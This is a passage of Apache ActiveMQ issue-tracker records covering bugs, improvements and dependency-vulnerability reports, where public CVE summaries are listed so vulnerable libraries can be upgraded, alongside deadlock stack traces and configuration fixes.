http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.htmlCONFIRM - http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.htmlCONFIRM - http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.htmlCONFIRM - http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.htmlCONFIRM - http://www.vmware.com/security/advisories/VMSA-2014-0008.htmlCONFIRM - http://www.vmware.com/security/advisories/VMSA-2
issueID:AMQ-6992
type:Bug
changed files:
texts:ActiveMQ 5.15.4 jackson-databind-2.9.4.jar which has one high severity CVEs against it.
ctiveMQ 5.15.4 jackson-databind-2.9.4.jar which has one high severity CVEs against it.Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.CVE-2018-7489 Severity:High     CVSS Score: 7.5 (AV:N/AC:L/Au:N/C/I/A)CWE: CWE-184 Incomplete BlacklistFasterXML jackson-databind before 2.8.11.1 and 2.9.x before 2.9.5 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if thec3p0 libraries are available in the classpath.BID - 103203CONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.htmlCONFIRM - https://github.com/FasterXML/jackson-databind/issues/1931CONFIRM - https://security.netapp.com/advisory/ntap-20180328-0001/DEBIAN - DSA-4190REDHAT - RHSA-2018:1447REDHAT - RHSA-2018:1448REDHAT - RHSA-2018:1449REDHAT - RHSA-2018:1450REDHAT - RHSA-2018:1451REDHAT - RHSA-2018:1786SECTRACK - 1040693Vulnerable Software & Versions: (show all)cpe:/a:fasterxml:jackson-databind:2.9.4
issueID:AMQ-6994
type:Bug
changed files:
texts:ActiveMQ 5.15.4 tomcat-servlet-api-8.0.24.jar  which has four high severity CVEs against it.
ActiveMQ 5.15.4 tomcat-servlet-api-8.0.24.jar  which has four high severity CVEs against it.Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.Referenced In Projects/Scopes:ActiveMQ :: Assembly:compileActiveMQ :: Web:providedActiveMQ :: Web Console:providedCVE-2016-3092 Severity:High CVSS Score: 7.8 (AV:N/AC:L/Au:N/C:N/I:N/A:C)CWE: CWE-20 Improper Input ValidationThe MultipartStream class in Apache Commons Fileupload before 1.3.2, as used in Apache Tomcat 7.x before 7.0.70, 8.x before 8.0.36, 8.5.x before 8.5.3, and 9.x before9.0.0.M7 and other products, allows remote attackers to cause a denial of service (CPU consumption) via a long boundary string.BID - 91453CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1743480CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1743722CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1743738CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1743742CONFIRM - http://tomcat.apache.org/security-7.htmlCONFIRM - http://tomcat.apache.org/security-8.htmlCONFIRM - http://tomcat.apache.org/security-9.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.htmlCONFIRM - http://www.oracle.com/technetwork/topics/security/bulletinjul2016-3090568.htmlCONFIRM - https://bugzilla.redhat.com/show_bug.cgi?id=1349468CONFIRM - https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05204371CONFIRM - https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05289840CONFIRM - https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05324759DEBIAN - DSA-3609DEBIAN - DSA-3611DEBIAN - DSA-3614GENTOO - GLSA-201705-09JVN - JVN#89379547JVNDB - JVNDB-2016-000121MLIST - &#91;dev&#93; 20160621 CVE-2016-3092: Apache Commons Fileupload information disclosure vulnerabilityREDHAT - RHSA-2016:2068REDHAT - RHSA-2016:2069REDHAT - RHSA-2016:2070REDHAT - RHSA-2016:2071REDHAT - RHSA-2016:2072REDHAT - RHSA-2016:2599REDHAT - RHSA-2016:2807REDHAT - RHSA-2016:2808REDHAT - RHSA-2017:0455REDHAT - RHSA-2017:0456REDHAT - RHSA-2017:0457SECTRACK - 1036427SECTRACK - 1036900SECTRACK - 1037029SECTRACK - 1039606SUSE - openSUSE-SU-2016:2252UBUNTU - USN-3024-1UBUNTU - USN-3027-1Vulnerable Software & Versions: (show all)cpe:/a:apache:tomcat:8.0.24CVE-2016-5425  Severity:High CVSS Score: 7.2 (AV:L/AC:L/Au:N/C:C/I:C/A:C)CWE: CWE-264 Permissions, Privileges, and Access ControlsThe Tomcat package on Red Hat Enterprise Linux (RHEL) 7, Fedora, CentOS, Oracle Linux, and possibly other Linux distributions uses weak permissions for /usr/lib/tmpfiles.d/tomcat.conf, which allows local users to gain root privileges by leveraging membership in the tomcat group.BID - 93472CONFIRM - http://www.oracle.com/technetwork/topics/security/linuxbulletinoct2016-3090545.htmlEXPLOIT-DB - 40488MISC - http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.htmlMISC - http://packetstormsecurity.com/files/139041/Apache-Tomcat-8-7-6-Privilege-Escalation.htmlMLIST - &#91;oss-security&#93; 20161010 CVE-2016-5425 - Apache Tomcat packaging on RedHat-based distros - Root Privilege Escalation (affecting CentOS, Fedora,OracleLinux, RedHat etc.)REDHAT - RHSA-2016:2046SECTRACK - 1036979Vulnerable Software & Versions:cpe:/a:apache:tomcatCVE-2016-6325   Severity:High  CVSS Score: 7.2 (AV:L/AC:L/Au:N/C:C/I:C/A:C)CWE: CWE-264 Permissions, Privileges, and Access ControlsThe Tomcat package on Red Hat Enterprise Linux (RHEL) 5 through 7, JBoss Web Server 3.0, and JBoss EWS 2 uses weak permissions for (1) /etc/sysconfig/tomcat and(2) /etc/tomcat/tomcat.conf, which allows local users to gain privileges by leveraging membership in the tomcat group.BID - 93478CONFIRM - http://www.oracle.com/technetwork/topics/security/linuxbulletinoct2016-3090545.htmlCONFIRM - https://bugzilla.redhat.com/show_bug.cgi?id=1367447REDHAT - RHSA-2016:2045REDHAT - RHSA-2016:2046REDHAT - RHSA-2017:0455REDHAT - RHSA-2017:0456REDHAT - RHSA-2017:0457Vulnerable Software & Versions:cpe:/a:apache:tomcat:-CVE-2016-8735 Severity:High CVSS Score: 7.5 (AV:N/AC:L/Au:N/C/I/A)CWE: CWE-284 Improper Access ControlRemote code execution is possible with Apache Tomcat before 6.0.48, 7.x before 7.0.73, 8.x before 8.0.39, 8.5.x before 8.5.7, and 9.x before 9.0.0.M12 ifJmxRemoteLifecycleListener is used and an attacker can reach JMX ports. The issue exists because this listener wasn"t updated for consistency with the CVE-2016-3427Oracle patch that affected credential types.BID - 94463CONFIRM - http://seclists.org/oss-sec/2016/q4/502CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1767644CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1767656CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1767676CONFIRM - http://svn.apache.org/viewvc?view=revision&revision=1767684CONFIRM - http://tomcat.apache.org/security-6.htmlCONFIRM - http://tomcat.apache.org/security-7.htmlCONFIRM - http://tomcat.apache.org/security-8.htmlCONFIRM - http://tomcat.apache.org/security-9.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.htmlCONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.htmlCONFIRM - https://security.netapp.com/advisory/ntap-20180607-0001/DEBIAN - DSA-3738REDHAT - RHSA-2017:0455REDHAT - RHSA-2017:0456REDHAT - RHSA-2017:0457SECTRACK - 1037331Vulnerable Software & Versions: (show all)
issueID:AMQ-6996
type:Bug
changed files:
texts:ActiveMQ 5.15.4 xercesImpl-2.11.0.jar which has one high severity CVE against it.
ActiveMQ 5.15.4 xercesImpl-2.11.0.jar which has one high severity CVE against it.Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.CVE-2012-0881 Severity:High  CVSS Score: 7.8 (AV:N/AC:L/Au:N/C:N/I:N/A:C)CWE: CWE-399 Resource Management ErrorsApache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.CONFIRM - https://bugzilla.redhat.com/show_bug.cgi?id=787104MLIST - &#91;oss-security&#93; 20140708 Summer bug cleaning - some Hash DoS stuffVulnerable Software & Versions:cpe:/a:apache:xerces2_java:2.11.0 and all previous versions
issueID:AMQ-6997
type:Task
changed files:
texts:AMQP: Update Qpid JMS and Proton-J latest versions
None
issueID:AMQ-7000
type:Bug
changed files:
texts:RAR - occasional hang on graceful server shutdown
Active sessions getting closed on shutdown/release of the RAR endpoints can occasionally get back into the active pool in error, preventing the server session pool close process from completing.
issueID:AMQ-7001
type:Bug
changed files:JMSMappingOutboundTransformer.java
texts:Contention on message properties with amqp jms transfromer and kahadb concurrentStoreAndDispatch
Openwire to AMQPSend can fail with ConcurrentModificationException. Stack trace:javax.jms.JMSException: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationExceptionat org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1403)at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1436)at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1323)at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1976)at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:288)at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:223)at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)at org.apache.activemq.transport.amqp.interop.OpenWireToAmqpConcurrentStoreAndDispatchTest$2.run(OpenWireToAmqpConcurrentStoreAndDispatchTest.java:158)at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)at java.lang.Thread.run(Thread.java:748)Caused by: java.lang.Throwable: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationExceptionat java.util.concurrent.FutureTask.report(FutureTask.java:122)at java.util.concurrent.FutureTask.get(FutureTask.java:192)at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:924)at org.apache.activemq.broker.region.Queue.send(Queue.java:767)at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:505)at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:477)at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:293)at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:295)at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:154)at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:572)at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:330)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:194)at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)... 1 moreCaused by: java.util.ConcurrentModificationExceptionat java.util.HashMap$HashIterator.nextNode(HashMap.java:1437)at java.util.HashMap$KeyIterator.next(HashMap.java:1461)at org.apache.activemq.util.MarshallingSupport.marshalPrimitiveMap(MarshallingSupport.java:61)at org.apache.activemq.command.Message.beforeMarshall(Message.java:261)at org.apache.activemq.openwire.v11.MessageMarshaller.looseMarshal(MessageMarshaller.java:281)at org.apache.activemq.openwire.v11.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111)at org.apache.activemq.openwire.v11.ActiveMQBytesMessageMarshaller.looseMarshal(ActiveMQBytesMessageMarshaller.java:111)at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:162)at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:537)at org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1513)at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)... 1 more
issueID:AMQ-7002
type:Bug
changed files:SchedulerBroker.java
texts:Activemq SchedulerBroker doSchedule can schedule duplicate jobIds leading to runtime exception
Under load we"ve observed that SchedulerBroker will attempt to schedule jobs using the same JobId.When JobScheduleView attempts to process these jobs we"ll encounter an exception during the below put call:@Overridepublic TabularData getAllJobs() throws Exception { OpenTypeFactory factory = OpenTypeSupport.getFactory(Job.class); CompositeType ct = factory.getCompositeType(); TabularType tt = new TabularType("Scheduled Jobs", "Scheduled Jobs", ct, new String[] { "jobId" {color}}); TabularDataSupport rc = new TabularDataSupport(tt); List<Job> jobs = this.jobScheduler.getAllJobs(); for (Job job : jobs) { rc.put(new CompositeDataSupport(ct, factory.getFields(job))); } return rc; {color}}This can be triggered by clicking on the Schduled tab in the webconsole.The error only occurs due to duplicate JobIds.Debugging this error, we can see that two jobs with different payloads have the same JobId - this should not be allowed to occur.We need to ensure that JobIds are unique.Note:In test scenario virtual topics are in use, with two consumers.Redelivery plugin is also in use on the Broker.<plugins>            <redeliveryPlugin fallbackToDeadLetter="false" sendToDlqIfMaxRetriesExceeded="false">                <redeliveryPolicyMap>                    <redeliveryPolicyMap>                        <defaultEntry>                            <redeliveryPolicy backOffMultiplier="2" initialRedeliveryDelay="60000" maximumRedeliveries="20" maximumRedeliveryDelay="300000" useExponentialBackOff="true"/>                        </defaultEntry>                    </redeliveryPolicyMap>                </redeliveryPolicyMap>            </redeliveryPlugin>        </plugins>
issueID:AMQ-7004
type:Improvement
changed files:FailoverTransport.java
texts:Request for improved FailoverTransport logging
This is a request for improved logging based on a recent production outage that could have been identified and resolved much faster with better logging in the FailoverTransport.Cluster update notifications are not logged. These are important, hopefully infrequent events and should be logged at INFO level in the updateURIs method:https://github.com/apache/activemq/blob/master/activemq-client/src/main/java/org/apache/activemq/transport/failover/FailoverTransport.java#L1279The exception that gives the cause of the failure to failover is logged at DEBUG level. This hid the root cause of the problem from us until we managed to figure out that additional information was available but hidden, and we turned up the logging level of the running client to DEBUG. Please turn this log line up to ERROR:https://github.com/apache/activemq/blob/master/activemq-client/src/main/java/org/apache/activemq/transport/failover/FailoverTransport.java#L1279Hopefully these are really trivial changes that you can make that will definitely enhance the operational transparency of the running clients.
issueID:AMQ-7006
type:Bug
changed files:StompSubscription.java
ProtocolConverter.java
texts:STOMP protocol converter tracks pending ACKS in Client mode but doesn&#39;t remove all ACK&#39;d IDs, just the one submitted.
The patch referenced in AMQ-5423 only addressed the memory leak for Client-Individual mode. Client mode is still affected as multiple messages are acknowledged with a single ACK.  The single ACK is removed from memory but all the rest remain which grows over time until AMQ crashes or until the client session ends and all the pending ACKs are cleaned up at that point.  At the moment we are having to regularly restart our STOMP clients to prevent the memory leak from causing a crash.
issueID:AMQ-7007
type:Improvement
changed files:
texts:Limit the jetty endpoint to localhost by default (web console/jolokia)
In order to reduce the exposed surface area of the broker it makes sense to limit the http endpoint to localhost by default.The default jetty.xml configuration will reference 127.0.0.1 to make this explicit. 
issueID:AMQ-701
type:Improvement
changed files:
texts:Unix scripts in distro should have mode 755
All of the unix scripts in the distro should have their mode set to 755, as in:cd bin/chmod 755 activemq browse bstat list query shutdownUsers should be able to unzip/untgz the distro and then run bin/activemq with out any extra steps.<zipfileset> supports a filemode attribute, and <tarfileset> suports a mode attribute that allow you to set the right mode on the archived files.See the "release" target here for a real example:http://svn.sourceforge.net/viewcvs.cgi/p4spam/p4spam/trunk/build.xml?view=markup&rev=57
issueID:AMQ-7011
type:Bug
changed files:ProtocolConverter.java
texts:Activemq 5.15.4 Stomp protocol allowed to enter deadlock via dispatch sync
Activemq 5.15.4 Stomp protocol allowed to enter deadlock via dispatch sync.Scenario:Stomp client setting the following:header.put("id", subId);header.put("activemq.dispatchAsync", "false");The setup of locks between TopicSubscription and MutexTransport while using Stomp in sync mode can result in a Deadlock as found below (Add and Destroy calls processing), each lock is identified by a + or * to show lock order in each stack trace.  Found one Java-level deadlock:============================="ActiveMQ Transport: tcp:///127.0.0.1:58303@61613":  waiting to lock monitor 0x00007f9c565d4d28 (object 0x00000007acc44708, a java.lang.Object),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:58302@61613""ActiveMQ Transport: tcp:///127.0.0.1:58302@61613":  waiting for ownable synchronizer 0x00000007ac872730, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:58303@61613"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: tcp:///127.0.0.1:58303@61613":++++++  at org.apache.activemq.broker.region.TopicSubscription.destroy(TopicSubscription.java:757)    - waiting to lock <0x00000007acc44708> (a java.lang.Object)    at org.apache.activemq.broker.region.AbstractRegion.destroySubscription(AbstractRegion.java:488)    at org.apache.activemq.broker.jmx.ManagedTopicRegion.destroySubscription(ManagedTopicRegion.java:52)    at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:480)    at org.apache.activemq.broker.region.TopicRegion.removeConsumer(TopicRegion.java:206)    at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:429)    at org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer(ManagedRegionBroker.java:258)    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)    at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:352)    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)    at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:729)    at org.apache.activemq.broker.TransportConnection.processRemoveSession(TransportConnection.java:768)    at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:879)    - locked <0x00000007ac999f00> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)    at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:73)    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:330)    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:194)*****   at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:97)    at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:202)    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompDisconnect(ProtocolConverter.java:838)    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:267)    at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)    at java.lang.Thread.run(Thread.java:748)"ActiveMQ Transport: tcp:///127.0.0.1:58302@61613":    at sun.misc.Unsafe.park(Native Method)    - parking to wait for  <0x00000007ac872730> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199)    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209)    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285)*****   at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)    at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1486)    at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971)    at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:927)    at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:715)+++++   at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:121)    - locked <0x00000007acc44708> (a java.lang.Object)    at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:48)    at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:775)    at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:556)    - locked <0x00000007acbd4e08> (a org.apache.activemq.broker.region.Topic)    at org.apache.activemq.broker.region.Topic.send(Topic.java:484)    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:505)    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:459)    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:293)    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:154)    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:293)    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:154)    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:572)    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768)    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:330)    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:194)    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:97)    at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:202)    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:345)    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:248)    at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)    at java.lang.Thread.run(Thread.java:748)In reviewing how MQTT and AMQP were handled, both set "consumerInfo.setDispatchAsync(true);"AMQPSession line 376MQTTDefualtSubscriptionStrategy line 61For MQTT fix see the below cards:ENTMQ-1504https://issues.jboss.org/browse/ENTMQ-1504?_sscc=tAMQ-5290https://issues.apache.org/jira/browse/AMQ-5290 https://github.com/apache/activemq/blame/master/activemq-mqtt/src/main/java/org/apache/activemq/transport/mqtt/strategy/MQTTDefaultSubscriptionStrategy.java#L61 I believe we can fix this for Stomp in ProtocolConverter, line 614, by also setting consumerInfo.setDispatchAsync(true); This would bring Stomp into alignment with the other protocols and how they were fixed.I"ll be providing a patch with the above change shortly.
issueID:AMQ-7012
type:Bug
changed files:ProtocolConverter.java
Stomp.java
texts:Misleading error in org.apache.activemq.transport.stomp.ProtocolConverter
From time to time I see the following log line for STOMP:  2018-07-17 07:31:22,204 | WARN  | Exception occurred processing: <Unknown> -> org.apache.activemq.transport.stomp.ProtocolException: No subscription matched. | org.apache.activemq.transport.stomp.ProtocolConverter | ActiveMQ NIO Worker 1186  The misleading part is "<Unknown>", the unknown is suppose to be the STOMP"s action word (SEND, SUBSCRIBE etc). The problem seems to be  org.apache.activemq.transport.stomp.ProtocolConverter.safeGetAction()that is comparing the STOMP action word with constants defined in org.apache.activemq.transport.stomp.ProtocolConverter.Stomp.CommandsBut for subscribe and unsubscribe the constants are defined as "SUB" and "UNSUB" which does not match the actual STOMP action verbs. 
issueID:AMQ-7013
type:Bug
changed files:
texts:XATransactionID hash function may generate duplicates.
XATransactionID hash function may generate duplicates.Scenario:XID formatId, GlobalTransaction, and BranchQualifier values are identical for many entries. We need to use a better hash function to avoid populating a map with many entries in the same bucket (results in bucket having O performance on recovery).Example using existing Hash Function:2018-07-18 06:13:29,866 | INFO  | Recovering from the journal @1:28 | org.apache.activemq.store.kahadb.MessageDatabase | main2018-07-18 06:23:04,070 | INFO  | @2:484592, 100000 entries recovered .. | org.apache.activemq.store.kahadb.MessageDatabase | main2018-07-18 06:23:04,099 | INFO  | Recovery replayed 100453 operations from the journal in 574.233 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main Using JenkinsHash:2018-07-18 10:58:43,713 | INFO  | Recovering from the journal @1:28 | org.apache.activemq.store.kahadb.MessageDatabase | main2018-07-18 10:58:51,302 | INFO  | @2:484592, 100000 entries recovered .. | org.apache.activemq.store.kahadb.MessageDatabase | main2018-07-18 10:58:51,329 | INFO  | Recovery replayed 100453 operations from the journal in 7.618 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main
issueID:AMQ-7015
type:New Feature
changed files:
texts:Startup performance improvement when log contains prepared transactions.
I have a KahaDB that"s performing a recovery on each startup.Digging deeper into it I"ve found that the issue is that the db.log contains prepared transactions.The MessageDatabase will discard those entries in memory, however it does not remove transaction info from those messages (I believe that"s by design). So on each restart, the broker will find those entries and again discard them in memory.If I access the broker via JMX, I can go to the prepared XAs and execute a clear on them one by one.When i restart my broker, i don"t have a recovery attempted again.Performing a remove operation for each message can be very time consuming, so i"d like to introduce an optional parameter to allow all prepared XAs to be removed on recovery.Please see my forth coming patch with unit test.
issueID:AMQ-7017
type:Bug
changed files:
texts:ProducerBrokerExchange.getPercentageBlocked() throws ArithmeticException (divide by zero)
I found this when testing a broker plugin for tracking messages sent (including some stats like getPercentageBlocked). When there have been no blocked messages an ArithmeticException is thrown due to an unchecked divide by zero. I fixed it and added a couple unit tests.
issueID:AMQ-7019
type:Bug
changed files:
texts:ActiveMQ 5.15.4 jolokia.jar which has one high severity CVE against it.
ActiveMQ 5.15.4 jolokia.jar which has one high severity CVE against it.Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.CVE-2015-5182 Severity:High  CVSS Score: 6.8 allows Cross-site request forgery (CSRF) vulnerability in the jolokia API in A-MQ. CONFIRM - https://bugzilla.redhat.com/show_bug.cgi?id=1248809 CONFIRM
issueID:AMQ-702
type:Improvement
changed files:
texts:`bstat --help` should display something useful
`bstat --help` should display something useful.  Right now using a non-standard connectorPort for the managementContext I get this:jason@Sanity:...bator-activemq-4.0-RC3/bin>./bstat --helpACTIVEMQ_HOME: /Users/jason/ws/paybytouch/ea/activemq/node1/incubator-activemq-4.0-RC3ERROR: java.lang.RuntimeException: Failed to execute query task. Reason: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: localhost; nested exception is:         java.net.ConnectException: Connection refused]ERROR: java.lang.Exception: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: localhost; nested exception is:         java.net.ConnectException: Connection refused]`bstat localhost --help` works, showing that this is really calling `query`.  Anyways, not very helpful when the JMX URL is changed from the default.
issueID:AMQ-7021
type:Improvement
changed files:
texts:DestinationMap access inside Abstract Region readwrite lock does not need sync
Using multiple virtual topic publishers, there is unnecessary serialisation via the destination map.the read write lock introduced in AMQ-3454 is sufficient to guard access in this case and reads should operate in parallel.with many thousand destinations lookup can be expensive and the serialisation becomes apparent.
issueID:AMQ-7023
type:New Feature
changed files:
texts:Add OWASP Dependency Check to build (all open source projects everywhere)
Please add OWASP Dependency Check to the ActiveMQ build (pom.xml).   OWASP DC makes an outbound REST call to MITRE Common Vulnerabilities & Exposures (CVE) to perform a lookup for each dependant .jarOWASP Dependency check : https://www.owasp.org/index.php/OWASP_Dependency_Check has plug-ins for most Java build/make types (ant, maven, gradle).   Add the appropriate command to the nightly build to generate a report of all known vulnerabilities in any/all third party libraries/dependencies that get pulled in. Generating this report nightly/weekly will help inform the project"s development team if any dependant libraries have a reported known vulneraility.  Project teams that keep up with removing vulnerabilities on a weekly basis weekly basis will help protect businesses that rely on these open source componets.
issueID:AMQ-7027
type:Improvement
changed files:
texts:Upgrade Jetty to 9.2.25.v20180606
Jetty Multiple Flaws Let Remote Users Conduct HTTP Request Smuggling and Session Hijacking Attacks and Determine the Installation Pathhttps://securitytracker.com/id/1041194https://bugs.eclipse.org/bugs/show_bug.cgi?id=535669
issueID:AMQ-7029
type:Improvement
changed files:
texts:Dependency Updates
There are a few dependencies that need updating with their latest point releases
issueID:AMQ-7030
type:Bug
changed files:
